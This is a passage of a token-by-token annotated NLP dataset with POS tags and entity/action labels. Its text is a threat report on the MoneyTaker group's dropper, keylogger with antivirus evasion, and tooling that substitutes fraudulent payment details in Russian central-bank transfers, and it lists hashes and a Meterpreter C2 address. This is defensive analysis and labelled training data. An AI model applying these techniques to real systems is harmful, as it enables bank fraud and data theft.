screenshots NNS O O
of IN O O
the DT O O
user NN O O
’ NNP O O
s NN O O
desktop NN O O
and CC O O
get VB O O
the DT O O
contents NNS O O
from IN O O
the DT O O
clipboard NN O O
. . O O

All PDT O O
this DT O O
data NN O O
can MD O O
be VB O O
stored VBN O O
in IN O O
a DT O O
file NN O O
of IN O O
the DT O O
temporary JJ O O
directory NN O O
. . O O

Dropper NN O O
This DT O O
is VBZ O O
an DT O O
NSIS-packed JJ O O
downloader NN O O
. . O O

Upon IN O O
its PRP$ O O
launch NN O O
it PRP O O
creates VBZ O O
the DT O O
following VBG O O
files NNS O O
: : O O
% NN B-Entity 1
Temp NNP I-Entity O
% NN I-Entity O
\datepicker-ru JJ I-Entity O
_ NN I-Entity O
RU.js NNP I-Entity O
% NN I-Entity O
Temp NNP I-Entity O
% NN I-Entity O
\LEJ NNP I-Entity O
% NN I-Entity O
2BPamplona CD I-Entity O
% NN I-Entity O
2BSanta.jpg CD I-Entity O
% NN I-Entity O
Temp NNP I-Entity O
% NN I-Entity O
\roknewsflash.css NN I-Entity O
% NN I-Entity O
Temp NNP I-Entity O
% NN I-Entity O
\fonts.css NN I-Entity O
% NN I-Entity O
Temp NNP I-Entity O
% NN I-Entity O
\addons.css NN I-Entity O
% NN I-Entity O
Temp NNP I-Entity O
% NN I-Entity O
\tracker.php NN I-Entity O
% NN I-Entity O
Temp NNP I-Entity O
% NN I-Entity O
\mJ8OS5lCf8xFQQiX4F1Ei.sNXbnF1xay NN I-Entity O
% NN I-Entity O
Temp NNP I-Entity O
% NN I-Entity O
\ NNP I-Entity O
< NNP I-Entity O
rnd NN I-Entity O
_ NNP I-Entity O
chars VBZ I-Entity O
> CD I-Entity O
.tmp\System.dll NN I-Entity O
The DT I-Entity O
dropper NN I-Entity O
twice RB O O
launches VBZ O O
its PRP$ O O
own JJ O O
file NN O O
as IN O O
a DT O O
child NN O O
process NN O O
. . O O

It PRP O O
decrypts VBZ O O
the DT O O
data NN O O
buffer NN O O
, , O O
which WDT O O
is VBZ O O
stored VBN O O
in IN O O
the DT O O
dropper NN O O
in IN O O
an DT O O
encrypted VBN O O
form NN O O
, , O O
and CC O O
injects VBZ O O
it PRP O O
into IN O O
the DT O O
child NN O O
process NN O O
( ( O O
which WDT O O
is VBZ O O
launched VBN O O
last JJ O O
) ) O O
. . O O

That DT O O
is VBZ O O
how WRB O O
the DT O O
payload NN O O
is VBZ O O
started VBN O O
. . O O

Keylogger/Screenshotter NN O O
• IN O O
The DT O O
application NN O O
is VBZ O O
compiled VBN O O
in IN O O
Delphi NNP O O
. . O O

Its PRP$ O O
main JJ O O
form NN O O
contains NNS O O
text JJ O O
field NN O O
components NNS O O
and CC O O
5 CD O O
timers NNS O O
. . O O

• NNS O O
Based VBN O O
on IN O O
the DT O O
names NNS O O
of IN O O
components NNS O O
in IN O O
Portuguese JJ O O
, , O O
we PRP O O
assume VBP O O
that IN O O
either CC O O
its PRP$ O O
author NN O O
is VBZ O O
Portuguese-speaking JJ O O
, , O O
or CC O O
the DT O O
campaign NN O O
targets NNS O O
Portuguese-speaking JJ O O
countries NNS O O
( ( O O
for IN O O
example NN O O
, , O O
Brazil NNP O O
) ) O O
or CC O O
the DT O O
code NN O O
is VBZ O O
based VBN O O
on IN O O
the DT O O
source NN O O
code NN O O
of IN O O
the DT O O
Portuguese JJ O O
program NN O O
. . O O

• JJ O O
Functions NNS O O
of IN O O
the DT O O
application NN O O
are VBP O O
executed VBN O O
once IN O O
the DT O O
timer NN O O
triggers NNS O O
( ( O O
after IN O O
the DT O O
time NN O O
interval NN O O
, , O O
which WDT O O
is VBZ O O
specified VBN O O
in IN O O
this DT O O
timer NN O O
as IN O O
the DT O O
interval NN O O
of IN O O
the DT O O
timer NN O O
operation NN O O
) ) O O
. . O O

17 CD O O
Timer NN O O
name NN O O
Function NN O O
Status NN O O
at IN O O
the DT O O
time NN O O
of IN O O
launch NN O O
Timer NNP O O
's POS O O
triggering VBG B-Action 1
interval NN B-Entity 2
Activity NN I-Entity O
of IN I-Entity O
the DT I-Entity O
triggered JJ I-Entity O
timer NN I-Entity O
InternetTimer NN I-Entity O
Timer NN I-Entity O
activating VBG I-Entity O
AtivatTimer NN I-Entity O
enabled VBN I-Entity O
10 CD I-Entity O
seconds NNS I-Entity O
Triggers NNS I-Entity O
the DT I-Entity O
activation NN I-Entity O
timer NN I-Entity O
KeyloggerTimer NNP I-Entity O
Keylogger NNP I-Entity O
timer NN I-Entity O
disabled JJ I-Entity O
1 CD I-Entity O
millisecond NN I-Entity O
EnviarTimer NN I-Entity O
Data NNP I-Entity O
export NN I-Entity O
timer NN I-Entity O
disabled JJ I-Entity O
5 CD I-Entity O
minutes NNS I-Entity O
AtivatTimer NN I-Entity O
Activation NNP I-Entity O
timer NN I-Entity O
disabled JJ I-Entity O
1 CD I-Entity O
millisecond NN I-Entity O
DesativatTimer NN I-Entity O
Deactivation NN I-Entity O
timer NN I-Entity O
disabled JJ I-Entity O
1 CD I-Entity O
millisecond NN I-Entity O
Activates VBZ B-Action 3
the DT B-Entity 4
functions NNS I-Entity O
of IN I-Entity O
the DT I-Entity O
keylogger NN I-Entity O
. . O O

Described VBN O O
in IN O O
detail NN O O
below NN O O
. . O O

Takes NNP B-Entity 1
screenshots NNS I-Entity O
, , I-Entity O
dumps NNS I-Entity O
all PDT I-Entity O
the DT I-Entity O
collected VBN I-Entity O
data NN I-Entity O
into IN B-Modifier 2
a DT B-Entity 3
file NN I-Entity O
. . O O

Will MD O O
be VB O O
described VBN O O
below IN O O
Triggers NNS O O
the DT O O
keylogger NN O O
timer NN O O
and CC O O
the DT O O
data NNS O O
export NN O O
timer NN O O
; : O O
disables VBZ O O
the DT O O
activation NN O O
timer NN O O
( ( O O
itself PRP O O
) ) O O
Triggers NNS O O
the DT O O
keylogger NN O O
timer NN O O
, , O O
and CC O O
the DT O O
data NNS O O
export NN O O
timer NN O O
; : O O
disables VBZ O O
the DT O O
deactivation NN O O
timer NN O O
( ( O O
itself PRP O O
) ) O O
• JJ O O
Timers NNP O O
’ NNP O O
names NNS O O
mean VBP O O
that IN O O
one CD O O
of IN O O
them PRP O O
is VBZ O O
used VBN O O
to TO O O
activate VB O O
network NN O O
functions NNS O O
( ( O O
InternetTimer NNP O O
) ) O O
, , O O
another DT O O
one CD O O
is VBZ O O
used VBN O O
to TO O O
send VB O O
data NNS O O
( ( O O
EnviarTimer NNP O O
) ) O O
. . O O

However RB O O
, , O O
in IN O O
fact NN O O
they PRP O O
perform VBP O O
other JJ O O
activity NN O O
. . O O

Instead RB O O
of IN O O
activating VBG O O
the DT O O
network NN O O
functions NNS O O
, , O O
the DT B-Entity 1
« NNP I-Entity O
InternetTimer NNP I-Entity O
» NN I-Entity O
timer NN I-Entity O
simply RB O O
activates VBZ O O
another DT O O
timer NN O O
, , O O
and CC O O
the DT O O
« NNP O O
EnviarTimer NNP O O
» NN O O
timer NN O O
( ( O O
translated VBN O O
as IN O O
« NN O O
sending VBG O O
timer JJR O O
» NN O O
) ) O O
captures VBZ O O
screenshots NNS O O
and CC O O
uploads IN O O
the DT O O
collected VBN O O
data NNS O O
to TO O O
a DT O O
file NN O O
in IN O O
a DT O O
temporary JJ O O
directory NN O O
. . O O

This DT O O
may MD O O
indicate VB O O
that IN O O
the DT O O
source NN O O
code NN O O
of IN O O
the DT O O
file NN O O
, , O O
which WDT O O
was VBD O O
originally RB O O
written VBN O O
for IN O O
other JJ O O
purposes NNS O O
( ( O O
including VBG O O
sending VBG O O
network NN O O
data NNS O O
) ) O O
, , O O
was VBD O O
then RB O O
slightly RB O O
modified VBN O O
. . O O

• NN O O
After IN O O
the DT O O
start NN O O
, , O O
the DT O O
application NN O O
executes VBZ O O
the DT O O
TForm1 NNP O O
. . O O

FormCreate NNP O O
( ( O O
) ) O O
procedure NN O O
, , O O
where WRB O O
it PRP O O
loads VBZ O O
the DT O O
necessary JJ O O
system NN O O
dynamic JJ O O
libraries NNS O O
into IN O O
the DT O O
address JJ O O
space NN O O
and CC O O
looks VBZ O O
for IN O O
the DT O O
addresses NNS O O
of IN O O
the DT O O
functions NNS O O
WinExec NNP O O
, , O O
GetAsyncKeyState NNP O O
, , O O
GetWindowTextA NNP O O
, , O O
GetForegroundWindow NNP O O
KeyloggerTimer NNP O O
in IN O O
them PRP O O
. . O O

When WRB O O
the DT O O
timer NN O O
triggers NNS O O
, , O O
it PRP O O
intercepts VBZ O O
keystrokes NNS O O
. . O O

It PRP B-Entity 1
also RB O O
extracts VBZ O O
the DT O O
name NN O O
of IN O O
the DT O O
application NN O O
( ( O O
the DT O O
window NN O O
title NN O O
) ) O O
in IN O O
which WDT O O
the DT O O
key NN O O
was VBD O O
pressed VBN O O
and CC O O
the DT O O
date NN O O
/ JJ O O
time NN O O
of IN O O
pressing NN O O
. . O O

Below NNP O O
is VBZ O O
an DT O O
example NN O O
of IN O O
a DT O O
record NN O O
of IN O O
the DT O O
keylogger NN O O
log NN O O
. . O O

Bold JJ O O
marked VBN O O
are VBP O O
pressed VBN O O
keys NNS O O
or CC O O
dialog NN O O
box NN O O
titles NNS O O
in IN O O
which WDT O O
these DT O O
keys NNS O O
were VBD O O
entered VBN O O
[ JJ B-Entity 1
F2 NNP I-Entity O
] NNP I-Entity O
[ NNP I-Entity O
F9 NNP I-Entity O
] NNP I-Entity O
< NNP I-Entity O
/textarea NNP I-Entity O
> NNP I-Entity O
< NNP I-Entity O
br NN I-Entity O
> NNP I-Entity O
< NNP I-Entity O
br NN I-Entity O
> NNP I-Entity O
< NNP I-Entity O
b NN I-Entity O
> NNP I-Entity O
< NNP I-Entity O
font VBD I-Entity O
color NN I-Entity O
= NN I-Entity O
« NNP I-Entity O
green JJ I-Entity O
» NNP I-Entity O
> NNP I-Entity O
[ NNP I-Entity O
Run NNP I-Entity O
- : I-Entity O
2:53:54 CD I-Entity O
- : I-Entity O
11.11.2017 CD I-Entity O
] JJ I-Entity O
< NNP I-Entity O
br NN I-Entity O
> NNP I-Entity O
< NNP I-Entity O
/b NNP I-Entity O
> NNP I-Entity O
< NNP I-Entity O
/font NNP I-Entity O
> NNP I-Entity O
< NNP I-Entity O
style NN I-Entity O
> NNP I-Entity O
textarea NN I-Entity O
{ ( I-Entity O
width:100 NN I-Entity O
% NN I-Entity O
; : O O
height:7em NN O O
; : O O
} ) O O
< FW O O
/style JJ O O
> NNP O O
< NNP O O
textarea VBZ O O
readonly RB O O
> JJ O O
some DT O O
_ NN O O
entered VBN O O
_ JJ O O
word NN O O
< NNP O O
/textarea NNP O O
> NNP O O
< NNP O O
br NN O O
> NNP O O
< NNP O O
br NN O O
> NNP O O
< NNP O O
b NN O O
> NNP O O
< NNP O O
font VBD O O
color NN O O
= NN O O
« NN O O
green JJ O O
» NNP O O
> NNP O O
[ NNP O O
OllyDbg NNP O O
- : O O
1.exe CD O O
- : O O
[ NN O O
CPU NNP O O
- : O O
main JJ O O
thread NN O O
, , O O
module NN O O
1 CD O O
] SYM O O
- : O O
2:54:25 CD O O
- : O O
11.11.2017 CD O O
] JJ O O
< NNP O O
br NN O O
> NNP O O
< NNP O O
/b NNP O O
> NNP O O
< NNP O O
/font NNP O O
> NNP O O
< NNP O O
style NN O O
> NNP O O
textarea NN O O
{ ( O O
width:100 NN O O
% NN O O
; : O O
height:7em NN O O
; : O O
} ) O O
< FW O O
/style JJ O O
> NNP O O
< NNP O O
textarea VBZ O O
readonly RB O O
> JJ O O
18 CD O O
• IN O O
The DT O O
keylogger NN O O
records VBZ O O
the DT O O
results NNS O O
of IN O O
the DT O O
interception NN O O
to TO O O
the DT O O
TForm1.Memo1 NNP O O
object VBP O O
located VBN O O
on IN O O
the DT O O
application NN O O
’ NNP O O
s NN O O
main JJ O O
form NN O O
. . O O

From IN O O
here RB O O
data NNS O O
can MD O O
be VB O O
obtained VBN O O
for IN O O
further JJ O O
recording NN O O
to TO O O
a DT O O
file NN O O
in IN O O
a DT O O
temporary JJ O O
directory NN O O
. . O O

• JJ O O
EnviaTimer NNP O O
. . O O

Using VBG O O
the DT O O
API NNP O O
function NN O O
GetClipboardData NNP O O
( ( O O
) ) O O
it PRP O O
can MD O O
intercept IN O O
the DT O O
contents NNS O O
of IN O O
the DT O O
clipboard NN O O
• VB O O
The DT O O
anti-emulation NN O O
function NN O O
is VBZ O O
implemented VBN O O
in IN O O
the DT O O
timer NN O O
code NN O O
to TO O O
bypass VB B-Action 1
antivirus NN B-Entity 2
and CC I-Entity O
automated JJ I-Entity O
sample NN I-Entity O
analysis NN I-Entity O
by IN B-Modifier 3
calling VBG B-Entity 4
the DT I-Entity O
ValidateName NNP I-Entity O
( ( I-Entity O
) ) I-Entity O
function NN I-Entity O
. . O O

Purportedly RB O O
, , O O
this DT O O
method NN O O
of IN O O
anti-emulation NN O O
was VBD O O
copied VBN O O
from IN O O
a DT O O
public JJ O O
Russian NN O O
speaking VBG O O
source NN O O
( ( O O
the DT O O
forum NN O O
https NN O O
: : O O
//fuckav.ru/showpost NN O O
. . O O

php NN O O
? . O O
p=109096 NN O O
& CC O O
postcount=63 NN O O
) ) O O
and CC O O
was VBD O O
implemented VBN O O
with IN O O
an DT O O
error NN O O
, , O O
due JJ O O
to TO O O
which WDT O O
the DT O O
functions NNS O O
of IN O O
taking VBG O O
screenshots NNS O O
and CC O O
writing VBG B-Action 1
data NNS B-Entity 2
to TO O O
a DT O O
file NN O O
( ( O O
which WDT O O
is VBZ O O
located VBN O O
in IN O O
code NN O O
after IN O O
checking VBG O O
for IN O O
emulation NN O O
) ) O O
may MD O O
not RB O O
be VB O O
executed VBN O O
. . O O

• NN O O
It PRP O O
takes VBZ O O
a DT O O
screenshot NN O O
of IN O O
the DT O O
desktop NN O O
, , O O
compresses VBZ O O
it PRP O O
into IN O O
JPEG NNP O O
and CC O O
encodes NNS O O
in IN O O
base64 NN O O
• NN O O
It PRP O O
creates VBZ B-Action 1
a DT B-Entity 2
file NN I-Entity O
with IN I-Entity O
the DT I-Entity O
name NN I-Entity O
“ NNP I-Entity O
% NN I-Entity O
Temp NNP I-Entity O
% NN I-Entity O
\perflog1.tmp NNP I-Entity O
” NN I-Entity O
Example NN I-Entity O
of IN I-Entity O
the DT I-Entity O
contents NNS I-Entity O
of IN I-Entity O
the DT I-Entity O
“ NNP I-Entity O
% NN I-Entity O
Temp NNP I-Entity O
% NN I-Entity O
\ NN I-Entity O
perflog1.tmp NN I-Entity O
” NN I-Entity O
file NN I-Entity O
collected VBN I-Entity O
by IN I-Entity O
keylogger NN I-Entity O
and CC I-Entity O
screenshotter NN I-Entity O
• NN I-Entity O
Network NNP I-Entity O
communications NNS I-Entity O
used VBD O O
to TO O O
send VB O O
collected VBN O O
data NNS O O
have VBP O O
not RB O O
been VBN O O
detected VBN O O
in IN O O
the DT O O
analyzed JJ O O
file NN O O
. . O O

19 CD O O
06 CD O O
ATTACK NN O O
ON NNP O O
AWS NNP O O
CBR NNP O O
In IN O O
August NNP O O
2016 CD O O
hackers NNS O O
successfully RB O O
infiltrated VBD O O
the DT O O
network NN O O
of IN O O
a DT O O
Russian JJ O O
bank NN O O
. . O O

They PRP O O
used VBD O O
an DT O O
automated JJ O O
system NN O O
to TO O O
steal VB B-Action 1
money NN B-Entity 2
through IN I-Entity O
the DT I-Entity O
AWS NNP I-Entity O
CBR NNP I-Entity O
( ( I-Entity O
Automated NNP I-Entity O
Work NNP I-Entity O
Station NNP I-Entity O
Client NNP I-Entity O
of IN I-Entity O
the DT I-Entity O
Russian JJ I-Entity O
Central NNP I-Entity O
Bank NNP I-Entity O
) ) I-Entity O
, , O O
an DT O O
interbank NN O O
fund NN O O
transfer NN O O
system NN O O
. . O O

Name NN O O
main.exe NN O O
igfxserv.exe NN O O
xml.exe NN O O
ed.exe NN O O
txt.exe NN O O
MD5 NN O O
Type NN O O
D57608F6DB9045752165EAF93452D57F NN O O
Main NNP O O
module NN O O
A70F905266F3D57B73B1D8A265286FD5 NN O O
Module NN O O
used VBN O O
to TO O O
substitute VB O O
payment NN O O
messages NNS O O
92B03E123B2D97B8E8E274224273EC5E CD O O
Module NN O O
used VBN O O
to TO O O
hide VB O O
fraudulent JJ O O
transfers NNS O O
Module NN O O
used VBN O O
to TO O O
work VB B-Action 1
with IN B-Modifier 2
temporary JJ B-Entity 3
files NNS I-Entity O
arsm32.exe NN I-Entity O
A70F905266F3D57B73B1D8A265286FD5 NN I-Entity O
UltraVNC NN I-Entity O
hostsec64.exe NN I-Entity O
92B03E123B2D97B8E8E274224273EC5E CD I-Entity O
VNC NNP I-Entity O
client NN I-Entity O
hostsec32.exe NN I-Entity O
VNC NNP I-Entity O
client NN I-Entity O
empty32.exe NN I-Entity O
A70F905266F3D57B73B1D8A265286FD5 NN I-Entity O
VNC NNP I-Entity O
client NN I-Entity O
1E4499560CDD2F69ECBED8761CAC7272 CD I-Entity O
8B1B5D1C8430EC16735E5DED94112B18 CD I-Entity O
Meterpreter NN I-Entity O
https NN I-Entity O
: : O O
//185.86.149.140/Y0DNA:443 NN O O
09A7F9813F6DE28F2D7BCBA032390662 CD O O
Meterpreter NN O O
B5450C8553DEF4996426AB46996B2E55 NN O O
185.86.149.140 CD O O
Meterpreter NN O O
Meterpreter NN O O
4672E624C5210A523AA0A0B56DB677B6 CD O O
Keylogger NNP O O
stores NNS O O
logs NNS O O
in IN O O
snmp.dat NN O O
test64.exe NN O O
test32.exe NN O O
btcp32.exe NN O O
load64.exe NN O O
plink.exe NN O O
Far.exe NN O O
4.bat CD O O
nbt.EXE NN O O
hkcmd.exe NN O O
at1.bat NN O O
startdll32.exe NN O O
qpd.exe NN O O
20 CD O O
Having VBG O O
accessed VBN O O
the DT O O
bank NN O O
’ NNP O O
s VBZ O O
internal JJ O O
network NN O O
, , O O
hackers NNS B-Entity 4
downloaded VBD B-Action 5
a DT B-Entity 6
modular JJ I-Entity O
tool NN I-Entity O
called VBN I-Entity O
Moneytaker NNP I-Entity O
v5.0 NN I-Entity O
to TO I-Entity O
the DT I-Entity O
server NN I-Entity O
of IN I-Entity O
the DT I-Entity O
AWS NNP I-Entity O
CBR NNP I-Entity O
. . O O

This DT O O
is VBZ O O
the DT O O
tool NN O O
which WDT O O
the DT O O
group NN O O
has VBZ O O
been VBN O O
named VBN O O
after IN O O
. . O O

Its PRP$ O O
main JJ O O
module NN O O
is VBZ O O
located VBN O O
in IN O O
the DT O O
directory NN O O
“ NNP O O
c NN O O
: : O O
\intel\logs\1\mt\bin JJ O O
” NN O O
and CC O O
has VBZ O O
the DT O O
name NN O O
“ NNP O O
main.exe NN O O
” NN O O
or CC O O
“ VB O O
igfxserv.exe JJ O O
” NN O O
. . O O

This DT O O
is VBZ O O
a DT O O
program NN O O
without IN O O
network NN O O
communications NNS O O
and CC O O
it PRP O O
should MD O O
run VB B-Action 1
with IN B-Modifier 2
the DT B-Entity 3
main JJ I-Entity O
configuration NN I-Entity O
file NN I-Entity O
specified VBN I-Entity O
as IN I-Entity O
an DT I-Entity O
argument NN I-Entity O
. . O O

It PRP O O
is VBZ O O
initialized VBN O O
according VBG O O
to TO O O
the DT O O
configuration NN O O
file NN O O
, , O O
then RB O O
it PRP O O
checks VBZ O O
the DT O O
presence NN O O
of IN O O
the DT O O
modules NNS O O
specified VBN O O
in IN O O
the DT O O
configuration NN O O
file NN O O
and CC O O
backups NNS B-Entity 1
of IN I-Entity O
certain JJ I-Entity O
AWS NNP I-Entity O
CBR NNP I-Entity O
directories NNS I-Entity O
. . O O

Further RB O O
through IN O O
the DT O O
report NN O O
, , O O
in IN O O
the DT O O
behavior NN O O
description NN O O
which WDT O O
depends NNS O O
on IN O O
the DT O O
configuration NN O O
file NN O O
, , O O
the DT O O
name NN O O
of IN O O
the DT O O
argument NN O O
will MD O O
be VB O O
specified VBN O O
. . O O

MAIN NNP O O
MODULE NNP O O
– NNP O O
“ NNP O O
MAIN.EXE NNP O O
” NNP O O
OR NNP O O
“ JJ O O
IGFXSERV.EXE NNP O O
” NN O O
The DT O O
main JJ O O
module NN O O
is VBZ O O
started VBN O O
by IN O O
passing VBG B-Action 1
the DT B-Entity 2
main JJ I-Entity O
configuration NN I-Entity O
file NN I-Entity O
“ '' I-Entity O
c NNS I-Entity O
: : O O
\intel\logs\1\mt\config\main-config.txt JJ O O
” NN O O
as IN O O
an DT O O
argument NN O O
. . O O

The DT O O
module NN O O
logs NNS O O
all DT O O
events NNS O O
to TO O O
the DT O O
“ JJ O O
Main-Logfile JJ O O
” NN O O
file NN O O
. . O O

Upon IN O O
startup NN O O
, , O O
the DT O O
module NN O O
looks VBZ O O
for IN O O
XML NNP O O
, , O O
ED NNP O O
and CC O O
TXT NNP O O
modules NNS O O
specified VBN O O
in IN O O
the DT O O
config NN O O
file NN O O
as IN O O
“ NNP O O
XmlBin NNP O O
” NNP O O
“ NNP O O
EdBin NNP O O
” NNP O O
and CC O O
“ NNP O O
TxtBin NNP O O
” NNP O O
, , O O
respectively RB O O
. . O O

They PRP O O
also RB O O
search NN O O
for IN O O
their PRP$ O O
configuration NN O O
files NNS O O
, , O O
the DT O O
parameters NNS O O
: : O O
“ NN O O
XmlCfg NNP O O
” NN O O
“ JJ O O
EdCfg NNP O O
” NNP O O
and CC O O
“ NNP O O
TxtCfg NNP O O
” NNP O O
. . O O

If IN O O
configuration NN O O
files NNS O O
of IN O O
modules NNS O O
do VBP O O
not RB O O
exist VB O O
as IN O O
separate JJ O O
files NNS O O
, , O O
their PRP$ O O
settings NNS O O
are VBP O O
stored VBN O O
together RB O O
in IN O O
the DT O O
“ JJ O O
main- NN O O
config.txt NN O O
” NN O O
file NN O O
. . O O

The DT B-Entity 1
module NN I-Entity O
reads VBZ B-Action 2
the DT B-Entity 3
“ NNP I-Entity O
Directory NNP I-Entity O
” NNP I-Entity O
“ NNP I-Entity O
Backup NNP I-Entity O
” NNP I-Entity O
“ NNP I-Entity O
Recursive NNP I-Entity O
” NN I-Entity O
“ JJ I-Entity O
Action NNP I-Entity O
” NNP I-Entity O
parameters NNS I-Entity O
and CC O O
uses VBZ O O
the DT O O
WINAPI NNP O O
function NN O O
called VBD O O
ReadDirectoryChangesW NNP O O
( ( O O
) ) O O
to TO O O
monitor VB O O
the DT O O
files NNS O O
appearing VBG O O
in IN O O
the DT O O
directories NNS O O
specified VBN O O
in IN O O
the DT O O
“ NNP O O
Directory NNP O O
” NNP O O
. . O O

Directory NN O O
name NN O O
Designation NN O O
in IN O O
AWS NNP O O
CBR NNP O O
% NN O O
АРМ JJ O O
КБР CD O O
% NN O O
\exg\chk NN O O
Decrypted VBN O O
, , O O
unpacked JJ O O
and CC O O
verified JJ O O
electronic JJ O O
messages NNS O O
% NN O O
АРМ JJ O O
КБР CD O O
% NN O O
\exq\cli NN O O
Received VBN O O
messages NNS O O
from IN O O
AWS NNP O O
CBR NNP O O
formed VBD O O
according VBG O O
to TO O O
the DT O O
unified JJ O O
formats NNS O O
of IN O O
electronic JJ O O
messages NNS O O
of IN O O
the DT O O
Central NNP O O
Bank NNP O O
of IN O O
Russia NNP O O
% NN O O
АРМ JJ O O
КБР CD O O
% NN O O
\tmp NN O O
Temporary JJ O O
files NNS O O
When WRB O O
a DT O O
new JJ O O
file NN O O
appears VBZ O O
, , O O
the DT B-Entity 1
corresponding JJ I-Entity O
module NN I-Entity O
is VBZ I-Entity O
started VBN I-Entity O
( ( I-Entity O
ED NNP I-Entity O
for IN I-Entity O
the DT I-Entity O
“ NNP I-Entity O
chk NN I-Entity O
” NNP I-Entity O
directory NN I-Entity O
, , I-Entity O
XML NNP I-Entity O
for IN I-Entity O
the DT I-Entity O
“ NNP I-Entity O
cli NN I-Entity O
” NNP I-Entity O
directory NN I-Entity O
and CC I-Entity O
TXT NNP I-Entity O
for IN I-Entity O
the DT I-Entity O
“ JJ I-Entity O
tmp NN I-Entity O
” NNP I-Entity O
directory NN I-Entity O
) ) I-Entity O
and CC I-Entity O
copied VBN I-Entity O
to TO I-Entity O
the DT I-Entity O
directory NN I-Entity O
specified VBN I-Entity O
as IN I-Entity O
“ NNP I-Entity O
Backup NNP I-Entity O
” NNP I-Entity O
. . O O

21 CD O O
AWS NNP O O
CBR NNP O O
operator NN O O
ED101 NN O O
A DT B-Entity 1
legitimate JJ I-Entity O
payment NN I-Entity O
order NN I-Entity O
issued VBN I-Entity O
by IN I-Entity O
AWS NNP I-Entity O
CBR NNP I-Entity O
operator NN I-Entity O
XML.EXE NN I-Entity O
substitutes NNS I-Entity O
original JJ I-Entity O
payment NN I-Entity O
details NNS I-Entity O
with IN B-Modifier 2
fraudulent JJ B-Entity 3
ones NNS I-Entity O
% NN I-Entity O
ARM_CBR NNP I-Entity O
% NN I-Entity O
\exg\cli NN I-Entity O
% NN I-Entity O
ARM_CBR NNP I-Entity O
% NN I-Entity O
\exg\chk NN I-Entity O
AWS NNP I-Entity O
CBR NNP I-Entity O
validation NN I-Entity O
component NN I-Entity O
( ( O O
checks VB O O
the DT O O
correctness NN O O
of IN O O
the DT O O
payment NN O O
message NN O O
) ) O O
ED.EXE NN O O
restores NNS O O
original JJ O O
payment NN O O
details NNS O O
AWS NNP O O
CBR NNP O O
operator NN O O
receives VBZ O O
the DT O O
response NN O O
as IN O O
if IN O O
the DT O O
payment NN O O
details NNS O O
were VBD O O
the DT O O
initial JJ O O
ones NNS O O
, , O O
without IN O O
suspecting VBG O O
the DT O O
theft NN O O
. . O O

CBR NN O O
Payment JJ O O
order NN O O
with IN O O
the DT O O
fraudulent JJ O O
payment NN O O
details NNS O O
is VBZ O O
sent VBN O O
to TO O O
the DT O O
Central NNP O O
Bank NNP O O
of IN O O
Russia NNP O O
AUTOMATED NNP O O
REPLACEMENT NNP O O
MODULE NNP O O
– NN O O
“ JJ O O
XML.EXE NNP O O
” NN O O
The DT O O
main JJ O O
module NN O O
starts VBZ O O
the DT O O
“ NNP O O
xml.exe NNP O O
” NNP O O
file NN O O
, , O O
passing VBG O O
the DT O O
name NN O O
of IN O O
a DT O O
new JJ O O
file NN O O
in IN O O
the DT O O
“ NN O O
% NN O O
АРМ JJ O O
КБР CD O O
% NN O O
\exq\cli CC O O
” JJ O O
directory NN O O
and CC O O
the DT O O
config NN O O
file NN O O
. . O O

The DT O O
automated JJ O O
replacement NN O O
module NN O O
records NNS O O
detailed VBN O O
logs NNS O O
and CC O O
writes VBZ O O
them PRP O O
to TO O O
a DT O O
file NN O O
specified VBN O O
in IN O O
the DT O O
configuration NN O O
as IN O O
“ JJ O O
Xml-Logfile JJ O O
” NN O O
Electronic JJ O O
messages NNS O O
generated VBN O O
by IN O O
the DT O O
AWS NNP O O
CBR NNP O O
are VBP O O
placed VBN O O
in IN O O
the DT O O
“ NN O O
% NN O O
АРМ JJ O O
КБР CD O O
% NN O O
\exq\cli CC O O
” JJ O O
directory NN O O
for IN O O
further JJ O O
processing NN O O
by IN O O
the DT B-Entity 1
gateway NN I-Entity O
component NN I-Entity O
“ NNP I-Entity O
Input NNP I-Entity O
control NN I-Entity O
” NNP I-Entity O
. . O O

It PRP O O
is VBZ O O
at IN O O
this DT O O
point NN O O
that IN O O
the DT B-Entity 1
module NN I-Entity O
checks VBZ B-Action 2
the DT B-Entity 3
xml NN I-Entity O
file NN I-Entity O
for IN B-Modifier 4
validity NN B-Entity 5
and CC O O
determines VBZ O O
whether IN O O
the DT O O
electronic JJ O O
message NN O O
file NN O O
is VBZ O O
a DT O O
payment NN O O
order NN O O
( ( O O
the DT O O
“ NN O O
ED101 NNP O O
” NNP O O
type NN O O
) ) O O
. . O O

22 CD O O
For IN O O
ED101 NNP O O
, , O O
the DT O O
module NN O O
scans NNS O O
for IN O O
the DT O O
fields NNS O O
“ VBP O O
Purpose NNP O O
” NNP O O
, , O O
“ NNP B-Entity 1
Payer NNP I-Entity O
” NNP I-Entity O
, , I-Entity O
“ JJ I-Entity O
PersonalAcc NNP I-Entity O
” NNP I-Entity O
, , I-Entity O
“ NNP I-Entity O
Payee NNP I-Entity O
” NNP I-Entity O
, , I-Entity O
“ NNP I-Entity O
Name NNP I-Entity O
” NNP I-Entity O
, , I-Entity O
“ NNP I-Entity O
Bank NNP I-Entity O
BIC NNP I-Entity O
” NNP I-Entity O
, , I-Entity O
“ NNP I-Entity O
CorrespAcc NNP I-Entity O
” NNP I-Entity O
, , I-Entity O
“ NNP I-Entity O
KPP NNP I-Entity O
” NNP I-Entity O
, , I-Entity O
“ JJ I-Entity O
INN NNP I-Entity O
” NNP I-Entity O
, , I-Entity O
“ NNP I-Entity O
SUM NNP I-Entity O
” NNP I-Entity O
, , I-Entity O
“ NNP I-Entity O
AccDocNo NNP I-Entity O
” NNP I-Entity O
. . O O

Then RB O O
it PRP O O
reads VBZ O O
the DT O O
file NN O O
with IN O O
the DT O O
fraudsters NNS O O
’ VBP O O
payment NN O O
details NNS O O
- : O O
“ CD O O
Xml- NN O O
Workfile NNP O O
” NN O O
. . O O

The DT O O
following JJ O O
fields NNS O O
are VBP O O
specified VBN O O
: : O O
” JJ O O
name NN O O
” NNP O O
, , O O
” NNP O O
id NN O O
” NNP O O
, , O O
” NNP O O
acc VBZ O O
” CD O O
, , O O
“ JJ O O
inn NN O O
” NN O O
, , O O
“ NNP O O
kpp NNP O O
” NNP O O
, , O O
” NNP O O
bik NN O O
” NNP O O
, , O O
” NNP O O
corr NN O O
” NNP O O
, , O O
” NNP O O
purpose VBD O O
” NNP O O
. . O O

If IN O O
it PRP O O
manages VBZ O O
to TO O O
get VB O O
all PDT O O
the DT O O
necessary JJ O O
fields NNS O O
from IN O O
the DT O O
payment NN O O
order NN O O
and CC O O
the DT O O
“ JJ O O
Xml-Workfile JJ O O
” NN O O
file NN O O
has VBZ O O
required VBN O O
details NNS O O
, , O O
then RB O O
